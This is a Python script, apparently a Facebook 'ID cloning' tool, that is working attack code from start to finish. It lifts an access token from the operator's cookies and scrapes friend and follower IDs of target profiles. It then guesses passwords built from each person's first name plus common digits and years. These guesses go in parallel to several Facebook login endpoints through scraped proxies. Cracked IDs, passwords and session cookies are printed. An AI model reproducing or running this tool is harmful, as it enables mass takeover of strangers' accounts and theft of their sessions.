import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import bs4
from concurrent.futures import ThreadPoolExecutor
#---------------------
id = []
id2 = []
loop = 0
ok = 0
cp = 0
akun = []
method = []
tokenku = []
uid = []
ugen2=[]
ugen=[]
pws=[]
pws2=[]
#-------------------------------------------
#-------------------------------------------
user1=("Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36")
user1=(f"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2")
ugen2.append(user1)
user2=(f"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1")
user2=(f'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5')
ugen.append(user2)
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[ + ] ERROR')
#-------------------------------------------

#-------------------------------------------
logo = """
\033[1;34m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡇⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠘⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡇⠀⠹⠟⠋⣁⣤⣤⣤⣤⣈⠉⠻⠟⠀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠿⠿⠀⠀⠀⠻⠿⣿⣿⣿⣿⠿⠟⠀⠀⠀⠻⠿⢿⣿⣿⣿⣿⣿
⣿⣿⣿⠟⢁⣀⣤⣤⠀⡀⠀⠀⠀⠀⣸⣧⡀⠀⠀⠀⢀⠀⢠⣤⣄⣈⠛⢿⣿⣿
⣿⡿⣥⣾⣿⣿⣿⡇⠀⣿⣷⣄⠀⣸⣿⣿⣿⡀⢠⣾⣿⡆⢸⣿⣿⣿⣷⣮⣻⣿
⣿⣿⣿⣿⣿⣿⣿⣷⠀⢿⣿⣿⣿⠋⠙⠛⠉⣻⣿⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢿⣿⣿⡄⠀⠀⠀⣿⣿⡿⠁⣴⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡈⠛⠃⠀⠀⠀⠛⢉⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⢀⡄⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⣀⣴⣿⣿⣦⣄⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\033[34mBy \033[0;1m: \033[32mdr.zalost
\033[34mTELEGRAM \033[0;1m: \033[31;1mhttps://t.me/blackevil518
\033[34mVERSION \033[0;1m: \033[32m1.0
\033[0;1m---------------------------------------------
"""
#-------------------------------------------

#-------------------------------------------
def login():
	try:
		token = open('token.txt','r').read()
		cok = open('cookies.txt','r').read()
		tokenku.append(token)
	except KeyError:
		login2()
	except requests.exceptions.ConnectionError:
		exit()
	except IOError:
		login2()
	try:
		sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0], cookies = {"cookie":cok})
		sy2 = json.loads(sy.text)['name']
		sy3 = json.loads(sy.text)['id']
		menu()
	except KeyError:
		login2()
	except requests.exceptions.ConnectionError:
		exit()
	except IOError:
		login2()

def login2():
	os.system('clear')
	print(logo)
	try:
		cookie=input("[ + ] COOKIES: ")
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open("token.txt", "w").write(find_token.group(1))
		cok=open("cookies.txt", "w").write(cookie)
		print('-------------------------------------------')
		os.system('python fb.py')
	except Exception as e:
		os.system("rm -f cookies.txt")
		print('COOKIES ERROR')
		exit()
#-------------------------------------------

#-------------------------------------------
def menu():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m1 \033[0;1m] PUBLIC ID CLONE')
	print('\033[0;1m[ \033[31;1m2 \033[0;1m] PUBLIC ID CLONE ( MULTI )')
	print('\033[0;1m[ \033[31;1m3 \033[0;1m] FOLLOWERS ID CLONE ')
	print('\033[0;1m[ \033[31;1m0 \033[0;1m] LOGOUT')
	xoshnaw = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOICE: ')
	if xoshnaw in ['1','01']:
		public()
	elif xoshnaw in ['2','02']:
		multi()
	elif xoshnaw in ['3','03']:
		followers()
	elif xoshnaw in ['0','00']:
		os.system("rm -f cookies.txt")
		exit()
	else:
		exit()
#-------------------------------------------

#-------------------------------------------
def public():
	try:
		cok= open('cookies.txt','r').read()
		token = open('token.txt','r').read()
		tokenku.append(token)
	except IOError:
		exit()
	os.system('clear')
	print(logo)
	pil = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] ID: ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		run()
	except requests.exceptions.ConnectionError:
		print('Error');public()
	except (KeyError,IOError):
		print('Error');public()
#-------------------------------------------

#-------------------------------------------
def followers():
	try:
		cok= open('cookies.txt','r').read()
		token = open('token.txt','r').read()
		tokenku.append(token)
	except IOError:
		exit()
	os.system('clear')
	print(logo)
	pil = input('[ + ] ID: ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		run()
	except requests.exceptions.ConnectionError:
		exit();menu()
	except (KeyError,IOError):
		exit();menu()
#-------------------------------------------
def multi():
	try:
		cok= open('cookies.txt','r').read()
		token = open('token.txt','r').read()
		tokenku.append(token)
	except IOError:
		exit()
	try:
		os.system('clear')
		print(logo)
		nanya_keun = int(input('[ + ] CHAND DANA IDT DAWE ?: '))
	except:nanya_keun=100000000
	for mnh in range(nanya_keun):
		mnh +=1
		print()
		pil = input('[ + ] ID: ')
		try:
			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
			for pi in koh2['friends']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
		except requests.exceptions.ConnectionError:
			time.sleep(101)
		except (KeyError,IOError):
			print('\nError');multi()
	run()
#-------------------------------------------

def run():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m1 \033[0;1m] CRACK OLD IDS\n\033[0;1m[ \033[31;1m2 \033[0;1m] CRACK ALL IDS')
	hu = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE: ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['3','03']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		exit()
	os.system('clear')
	print(logo)
	print('[ 1 ] METHOD ( B-API )\n[ 2 ] METHOD ( FREE )\n[ 3 ] METHOD ( MBASIC )\n[ 4 ] METHOD ( MOBILE )')
	hc = input('\n[ + ] CHOOSE: ')
	if hc in ['1','01']:
		method.append('bapi')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('mobile')
	else:
		method.append('bapi')
		
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1mY \033[0;1m] YOUR PASSWORD\n\033[0;1m[ \033[31;1mT \033[0;1m] TOOL PASSWORD')
	pwss=input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE: ')
	if pwss in ['y','Y']:
		pws.append('ya')
		pwsss=input('\033[0;1m( \033[31;1m+ \033[0;1m) PASSWORD BNUSA: ')
		pwkuh=pwsss.split(',')
		for xpw in pwkuh:
			pws2.append(xpw)
	else:
		pws.append('no')
	passwrd()

def passwrd():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] TOTAL IDS: \033[32m'+str(len(id)))
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] CLONING HAS BEEN STARTED')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] TO STOP THE TOOL ( CTRL+Z )')
	print('-------------------------------------------')
	with ThreadPoolExecutor(max_workers=30) as xoshnaw:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'111222')
					pwv.append(frs+'123123')
					pwv.append(frs+'100200')
					pwv.append(frs+'1000')
					pwv.append(frs+'112233')
					pwv.append(frs+'22334455')
					pwv.append(frs+'223344')
					pwv.append(nmf)
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'12341234')
					pwv.append(frs+'123456')
					pwv.append(frs+'12345678')
					pwv.append(frs+'1234567')
					pwv.append(frs+'2003')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+'1122')
					pwv.append(frs+'11')
					pwv.append(frs+'12')
					pwv.append(frs+'10')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2006')
					pwv.append(frs+'2007')
					pwv.append(frs+'2008')
					pwv.append(frs+'2009')
					pwv.append(frs+'2010')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'111222')
					pwv.append(frs+'123123')
					pwv.append(frs+'100200')
					pwv.append(frs+'1000')
					pwv.append(frs+'112233')
					pwv.append(frs+'22334455')
					pwv.append(frs+'223344')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'12341234')
					pwv.append(frs+'123456')
					pwv.append(frs+'12345678')
					pwv.append(frs+'1234567')
					pwv.append(frs+'2003')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+'1122')
					pwv.append(frs+'11')
					pwv.append(frs+'12')
					pwv.append(frs+'10')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2006')
					pwv.append(frs+'2007')
					pwv.append(frs+'2008')
					pwv.append(frs+'2009')
					pwv.append(frs+'2010')
			if 'ya' in pws:
				for xpwd in pws2:
					pwv.append(xpwd)
			else:pass
			if 'bapi' in method:
				xoshnaw.submit(crack,idf,pwv)
			elif 'free' in method:
				xoshnaw.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				xoshnaw.submit(crackmbasic,idf,pwv)
			elif 'mobile' in method:
				xoshnaw.submit(crackmobile,idf,pwv)
			else:
				xoshnaw.submit(crackmbasic,idf,pwv)
	print('\n')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] CRACK TAWAW BU')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] ENTER TO MENU')
	meno = input('\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE: ');menu()


def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\033[0;1m[ \033[34;1m{loop}:{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1m{ok} \033[0;1m]  \033[0;1m[ \033[33;1m{cp} \033[0;1m]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text and "c_user" in send.text:
				print('\n')
				print(f'\033[32;1m[ + ] OK:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				ok+=1
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
				continue

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1


def crackmobile(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\033[0;1m[ \033[34;1m{loop}:{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1m{ok} \033[0;1m]  \033[0;1m[ \033[33;1m{cp} \033[0;1m]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				print(f'\033[32;1m[ + ] OK:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}\n[ + ] COOKIE: {kuki}')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1



def crackfree(idf,pwv):
	global loop,ok,cp
	l = loop*100/len(id2)
	o = '%'
	prox=open('.prox.txt','r').read().splitlines()
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r[ %s : %s ]  [ %s ]  [ %s ]'%(loop,len(id2),ok,cp));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				print(f'\033[32;1m[ + ] OK:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}\n[ + ] COOKIE: {kuki}')
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1


def crackmbasic(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r[ %s : %s ]  [ %s ]  [ %s ]'%(loop,len(id2),ok,cp));sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				print(f'[ + ] ID: {idf}\n[ + ] PASS: {pw}\n[ + ] COOKIE: {kuki}')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1


if __name__=='__main__':
	try:os.system('touch proxyy.txt')
	except:pass
	login()

